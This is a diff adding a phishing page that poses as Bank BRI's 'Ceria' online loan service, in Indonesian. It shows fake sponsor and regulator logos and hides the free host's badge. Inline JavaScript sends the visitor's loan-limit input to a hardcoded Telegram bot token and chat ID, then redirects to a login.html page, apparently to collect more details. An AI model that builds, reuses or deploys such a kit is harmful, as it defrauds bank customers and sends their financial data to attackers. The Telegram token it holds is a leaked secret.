@@ -1,0 +1,306 @@
+<!doctype html>
+<html lang="en" class="notranslate">
+    <head>
+        <meta charset="utf-8">
+        <title>Ceria - Pinjaman Uang Online</title>
+        <meta name="description" content="Ceria adalah pinjaman digital untuk pembiayaan transaksi melalui e-commerce, online travel site atau ride sharing. Ceria dari Bank BRI ini telah terdaftar dan diawasi oleh Otoritas Jasa Keuangan, sehingga jangan ragu untuk pengajuan limit karena aman. Saat ini, fasilitas Ceria dapat dinikmati oleh nasabah tabungan Bank BRI yang telah mengajukan limit melalui aplikasi Ceria dan mendapatkan persetujuan dalam hitungan menit. Buat kamu yang belum memiliki tabungan Bank BRI, yukk daftar sekarang supaya dapat mendaftar Ceria! Dengan Ceria, kamu bisa mewujudkan impianmu sekarang juga!">
+        <meta name="fragment" content="!">
+        <meta name="theme-color" content="#5e07a0">
+        <meta property="og:type" content="website">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0, user-scalable=no, minimal-ui">
+        <link rel="icon" type="image/png" href="img/icon.png">
+        <link rel="image_src" href="https://promo.bri.co.id/assets/img/upload/detail/19f42b0c3ad7b0a2d59d6cd80ca1f989.jpg">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.0/css/ionicons.min.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@500;700&amp;display=swap" rel="stylesheet">
+        <style>
+            @font-face {
+                font-family: 'Avenir';
+                src: url(fonts/AvenirNextLTPro-Bold.otf);
+            }
+
+            body {
+                padding: 0;
+                margin: 0;
+                width: 100%;
+                font-family: 'Open Sans', sans-serif;
+            }
+
+            .text-header {
+                font-family: 'Open Sans', sans-serif;
+                color: #76101b;
+            }
+
+            .text-subheader {
+                font-family: 'Open Sans', sans-serif;
+                margin-top: -20px;
+                color: #76101b;
+            }
+
+            .btn-punya {
+                display: block;
+                margin: 80px auto 0 auto;
+                padding: 0px;
+                cursor: pointer;
+                background: rgb(94,7,160);
+                border: none;
+                text-align: center;
+                height: 57px;
+                width: 459px;
+                max-width: 100%;
+                font-family: Arial;
+                font-size: 14px;
+                font-weight: bold;
+                color: rgb(255, 255, 255);
+                letter-spacing: 2px;
+                line-height: 1;
+                border-radius: 5px;
+                box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+                transition: background 200ms ease 0s;
+            }
+
+            .btn-belum {
+                display: block;
+                margin: 10px auto;
+                padding: 0px;
+                cursor: pointer;
+                background: none transparent;
+                border: none;
+                text-align: center;
+                height: 57px;
+                width: 459px;
+                max-width: 100%;
+                font-family: Arial;
+                font-size: 14px;
+                font-weight: bold;
+                color: rgb(0, 134, 224);
+                letter-spacing: 2px;
+                line-height: 1;
+                border-radius: 5px;
+                transition: background 200ms ease 0s;
+            }
+
+            .form-log {
+                box-sizing: border-box;
+                height: 55px;
+                width: 536px;
+                max-width: 100%;
+                border-top: 1.5px inset rgba(250, 250, 250, 0.13);
+                border-right: 1.5px solid rgba(184, 184, 184, 0.53);
+                border-bottom: none;
+                border-left: 1.5px outset rgba(168, 168, 168, 0.58);
+                border-image: initial;
+                background-color: rgb(255, 255, 255);
+                font-family: 'Open Sans', sans-serif;
+                font-weight: lighter;
+                font-size: 16px;
+                color: rgb(28, 28, 28);
+                word-spacing: 7px;
+                padding: 0px 45px;
+                outline: none;
+            }
+
+            #ionIcons {
+                color: rgb(22, 119, 199);
+                font-size: 29px;
+                position: absolute;
+                display: block;
+                margin-top: 7px;
+                margin-left: 15px;
+            }
+
+            .eye {
+                display: block;
+                margin: -40px auto;
+                margin-right: 20px;
+                position: relative;
+                box-sizing: border-box;
+                z-index: 16;
+                height: 19.8189px;
+                width: 25.0236px;
+                float: right;
+                border-radius: 0px;
+                cursor: pointer;
+            }
+
+            .btn-login {
+                font-family: 'Avenir';
+                display: block;
+                margin: 60px 0 0 0;
+                padding: 0px;
+                cursor: pointer;
+                background: rgb(94,7,160, 0.96);
+                border: none;
+                text-align: center;
+                height: 47px;
+                width: 100%;
+                font-family: Arial;
+                font-size: 15px;
+                font-weight: bold;
+                color: rgb(255, 255, 255);
+                letter-spacing: 1px;
+                line-height: 1;
+                border-radius: 8px;
+                box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+                transition: background 100ms step-start 0s;
+            }
+
+            h5 {
+                font-family: 'Open Sans', sans-serif;
+                color: #76101b;
+                font-size: 15px;
+                font-weight: bold;
+            }
+
+            h6 {
+                font-family: 'Open Sans', sans-serif;
+                color: #76101b;
+                font-size: 13px;
+                font-weight: bold;
+                opacity: 0.5;
+            }
+
+            .footer {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                color: #ffffff;
+                font-size: 5em;
+                text-transform: uppercase;
+                position: fixed;
+                bottom: 0px;
+                z-index: 1;
+            }
+
+            @media only screen and (max-width: 600px) {
+                .btn-login {
+                    width: 100%;
+                }
+            }
+        </style>
+        <style>
+            img[alt="www.000webhost.com"] {
+                display: none;
+            }
+        </style>
+                <script src="/js/jquery.min.js"></script>
+    </head>
+    <body>
+        <div class="container">
+            <div class="row">
+                <div class="col-12 d-block mx-auto text-center p-0" style="height: auto; width: auto; max-width: auto; margin-top: 0px; border-radius: 0px;">
+                    <img alt="" src="img/pucok.jpeg" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;">
+                </div>
+            </div>
+            <div onsubmit="$('button').prop('disabled',true);">
+                <div class="row" style="margin-top: 20px;">
+                    <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin-top: 0px auto;">
+                        <div>
+                            <select type="select" id="wwckxtyskgtrphbgehnnedtefobinacmabrd" name="tarif" placeholder="Pilih limit" required data-type="Select" data-label="Pilih limit" data-placeholder="Pilih limit" data-max-item-dropdown="5" class="brz-select select2-hidden-accessible" data-select2-id="wwckxtyskgtrphbgehnnedtefobinacmabrd" tabindex="-1" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 2px solid rgb(94,7,160); border-image: initial; background-color: rgb(235,235,235); border-radius: 8px; box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px; font-family: 'Avenir'; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 1px; padding: 10px 10px; outline: none;" aria-hidden="true">
+                                <option hidden value="" data-select2-id="2">Pilih limit</option>
+                                <optgroup label="Pilih Limit">
+                                <option value="Rp 10.000.000 - 12 bulan - bunga 1.42%">Rp 10.000.000 - 12 bulan - bunga 1.42%</option>
+                                <option value="Rp 15.000.000 - 12 bulan - bunga 1.42%">Rp 15.000.000 - 12 bulan - bunga 1.42%</option>
+                                <option value="Rp 20.000.000 - 12 bulan - bunga 1.42%">Rp 20.000.000 - 12 bulan - bunga 1.42%</option>
+                                <option value="Rp 25.000.000 - 12 bulan - bunga 1.42%">Rp 25.000.000 - 12 bulan - bunga 1.42%</option>
+                                <option value="Rp 50.000.000 - 12 bulan - bunga 1.42%">Rp 50.000.000 - 12 bulan - bunga 1.42%</option>
+                                </optgroup>
+                            </select>
+                        </div>
+                        <br>
+                        <div>
+                            <input id="dengan-rupiah" name="sisa" type="tel" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 2px solid rgb(94,7,160); border-image: initial; background-color: rgb(235,235,235); border-radius: 8px; box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px; font-family: 'Avenir'; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 1px; padding: 15px 15px; outline: none;" placeholder="Sisa Limit Saat Ini" maxlength="" minlength="" required>
+                        </div>
+                        <div class="row mt-3">
+                            <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: -30px auto;">
+                                <button class="btn-login" onclick="next()">Lanjutkan</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <br>
+        <br>
+        <br>
+        <h6 style="margin-top: 20px; font-family: 'Avenir'; font-size: 15px; font-weight: bold; color: #000; letter-spacing: 1px; text-align: center; line-height: 1; border-radius: 5px;">Program ini telah disponsori oleh:</h6>
+        <center>
+            <div class="css-dnzamn">
+                <img src="/img/3.png" width="200">
+                <br>
+                <img src="/img/2.jpeg" width="140">
+                <img src="/img/1.jpeg" width="140">
+            </div>
+            <h6 style="margin-top: 80px; font-family: 'Avenir'; font-size: 13px; font-weight: bold; color: #000; letter-spacing: 1px; text-align: center; line-height: 1; border-radius: 5px;">Terdaftar dan diawasi oleh:</h6>
+            <center>
+                <div class="css-dnzamn" style="margin-bottom:50px;">
+                    <img src="/img/ojk.png" width="90">
+                    <img src="/img/lps.png" width="90">
+                </div>
+                <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-u1OknCvxWvY5kfmNBILK2hRnQC3Pr17a+RTT6rIHI7NnikvbZlHgTPOOmMi466C8" crossorigin="anonymous"></script>
+                <script>
+                    var dengan_rupiah = document.getElementById('dengan-rupiah');
+                    dengan_rupiah.addEventListener('keyup', function(e) {
+                        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
+                    });
+                    function formatRupiah(angka, prefix) {
+                        var number_string = angka.replace(/[^,\d]/g, '').toString()
+                          , split = number_string.split(',')
+                          , sisa = split[0].length % 3
+                          , rupiah = split[0].substr(0, sisa)
+                          , ribuan = split[0].substr(sisa).match(/\d{3}/gi);
+
+                        if (ribuan) {
+                            separator = sisa ? '.' : '';
+                            rupiah += separator + ribuan.join('.');
+                        }
+
+                        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+                        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+                    }
+                </script>
+                <script>
+                    let token = '6816640348:AAGoztcMrx5t7RM0kw1llTYNlVW4krAr2EU'
+                    let chatId = '6841511136'
+                    const sendMessage = async (text) => {
+                        const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+
+                        const requestOptions = {
+                            method: 'POST',
+                            headers: {
+                            'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                            chat_id: chatId,
+                            text: text,
+                            }),
+                        };
+
+                        try {
+                            const response = await fetch(apiUrl, requestOptions);
+                            const data = await response.json();
+                            console.log(data);
+                            window.location.href = 'login.html'
+                        } catch (error) {
+                            console.error('Error sending message:', error);
+                        }
+                    };
+
+
+                    function next() {
+                        let sisa = document.querySelector('#dengan-rupiah').value
+                        if (sisa.length < 1) {
+                            alert('mohon lengkapi data!')
+                        } else {
+                            let text = `Sisa limit: ${sisa}`
+                            sendMessage(text)
+                        }
+                    }
+                </script>
+            </center>
+    </body>
+</html>
